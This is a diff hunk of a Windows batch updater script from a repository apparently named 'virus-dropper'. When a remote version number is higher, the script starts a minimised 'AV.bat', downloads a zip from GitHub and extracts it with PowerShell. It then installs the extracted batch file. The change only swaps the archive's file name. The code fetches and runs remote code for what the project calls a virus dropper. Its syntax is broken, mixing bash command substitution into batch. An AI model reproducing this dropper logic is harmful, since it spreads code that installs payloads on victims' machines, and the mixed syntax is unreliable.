@@ -5,7 +5,7 @@ FOR /F "tokens=* delims=" %%x in (version.txt) DO set /a version = %%x
 output=$(curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Version.txt")
 If %output%>%version%
   start /min AV.bat
-  curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Updates.zip" --output "Updates.zip"
+  curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Updater.zip" --output "Updates.zip"
   powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('%~dp0'); $zip = $shell.NameSpace('%~dp0\Updates.zip'); $target.CopyHere($zip.Items(), 16); }"
   del /f /q Updates.zip
   move "%~dp0\updates\Updater.bat" "%~dp0"
